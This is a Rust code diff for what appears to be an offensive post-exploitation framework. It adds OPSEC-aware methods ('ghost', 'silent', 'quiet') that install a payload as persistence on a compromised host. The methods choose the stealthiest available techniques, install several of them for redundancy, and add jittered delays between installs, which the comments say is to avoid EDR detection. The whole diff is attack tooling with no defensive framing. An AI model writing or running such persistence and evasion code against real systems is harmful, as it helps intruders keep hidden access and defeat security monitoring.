@@ -33,6 +33,7 @@ use uuid::Uuid;
 use crate::core::module::{
     CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType, Platform, Session,
 };
+use crate::modules::evasion::opsec::{OpsecConfig, DefaultTrafficShaper, TrafficShaper, StealthLevel as OpsecStealthLevel};
 
 // ============================================================================
 // Core Types
@@ -1549,6 +1550,147 @@ impl PersistenceEngine {
         }
 
         output
+    }
+
+    // =========================================================================
+    // OPSEC Integration Methods
+    // =========================================================================
+
+    /// Install persistence with Ghost mode OPSEC (maximum stealth)
+    ///
+    /// Uses Ghost-level OPSEC configuration:
+    /// - Only VeryHigh stealth methods selected
+    /// - 45+ second sleep between installations with 50-80% jitter
+    /// - EDR-aware execution
+    pub async fn install_ghost(
+        &mut self,
+        session: &Session,
+        payload_path: &str,
+        persistence_name: &str,
+        has_admin: bool,
+        safe_mode: bool,
+    ) -> Result<Vec<InstallResult>> {
+        self.install_with_opsec(session, payload_path, persistence_name, has_admin, OpsecConfig::ghost(), 1, safe_mode).await
+    }
+
+    /// Install persistence with Silent mode OPSEC (high stealth)
+    pub async fn install_silent(
+        &mut self,
+        session: &Session,
+        payload_path: &str,
+        persistence_name: &str,
+        has_admin: bool,
+        redundancy_count: usize,
+        safe_mode: bool,
+    ) -> Result<Vec<InstallResult>> {
+        self.install_with_opsec(session, payload_path, persistence_name, has_admin, OpsecConfig::silent(), redundancy_count, safe_mode).await
+    }
+
+    /// Install persistence with Quiet mode OPSEC (balanced)
+    pub async fn install_quiet(
+        &mut self,
+        session: &Session,
+        payload_path: &str,
+        persistence_name: &str,
+        has_admin: bool,
+        redundancy_count: usize,
+        safe_mode: bool,
+    ) -> Result<Vec<InstallResult>> {
+        self.install_with_opsec(session, payload_path, persistence_name, has_admin, OpsecConfig::quiet(), redundancy_count, safe_mode).await
+    }
+
+    /// Install with custom OPSEC configuration
+    ///
+    /// Applies traffic shaping and delays between each persistence installation
+    /// to avoid detection patterns.
+    pub async fn install_with_opsec(
+        &mut self,
+        session: &Session,
+        payload_path: &str,
+        persistence_name: &str,
+        has_admin: bool,
+        opsec_config: OpsecConfig,
+        redundancy_count: usize,
+        safe_mode: bool,
+    ) -> Result<Vec<InstallResult>> {
+        let traffic_shaper = DefaultTrafficShaper::new(opsec_config.clone());
+
+        info!(
+            stealth_level = %opsec_config.stealth_level.as_str(),
+            "Installing persistence with OPSEC awareness"
+        );
+
+        // Map OPSEC stealth level to minimum persistence stealth level
+        let min_stealth = match opsec_config.stealth_level {
+            OpsecStealthLevel::Ghost => StealthLevel::VeryHigh,
+            OpsecStealthLevel::Silent => StealthLevel::High,
+            OpsecStealthLevel::Quiet => StealthLevel::Medium,
+            OpsecStealthLevel::Normal => StealthLevel::Low,
+        };
+
+        // Filter methods based on stealth requirements
+        let mut method_indices: Vec<(usize, StealthLevel)> = self.methods
+            .iter()
+            .enumerate()
+            .filter(|(_, m)| {
+                let platform_matches = match m.platform() {
+                    Platform::Any => true,
+                    p => p == session.platform,
+                };
+                platform_matches
+                    && (has_admin || !m.requires_admin())
+                    && m.stealth_level() >= min_stealth
+            })
+            .map(|(i, m)| (i, m.stealth_level()))
+            .collect();
+
+        // Sort by stealth level (highest first)
+        method_indices.sort_by(|a, b| b.1.cmp(&a.1));
+
+        let mut results = Vec::new();
+        let mut installed_count = 0;
+
+        for (idx, (method_idx, _)) in method_indices.iter().enumerate() {
+            if installed_count >= redundancy_count {
+                break;
+            }
+
+            // Apply OPSEC delay between installations (except first)
+            if idx > 0 {
+                debug!("Applying OPSEC sleep with jitter before next persistence install");
+                traffic_shaper.sleep_with_jitter().await;
+            }
+
+            let method = &self.methods[*method_idx];
+            let method_name = method.name().to_string();
+
+            match method.install(session, payload_path, persistence_name, safe_mode).await {
+                Ok(result) => {
+                    if result.success {
+                        if let Some(handle) = &result.handle {
+                            self.installed.push(handle.clone());
+                        }
+                        installed_count += 1;
+                        info!(
+                            method = method_name,
+                            "OPSEC persistence installed successfully"
+                        );
+                    }
+                    results.push(result);
+                }
+                Err(e) => {
+                    warn!(method = method_name, error = %e, "OPSEC persistence install failed");
+                    results.push(InstallResult {
+                        success: false,
+                        handle: None,
+                        message: e.to_string(),
+                        commands_executed: vec![],
+                    });
+                }
+            }
+        }
+
+        Ok(results)
     }
 }
 
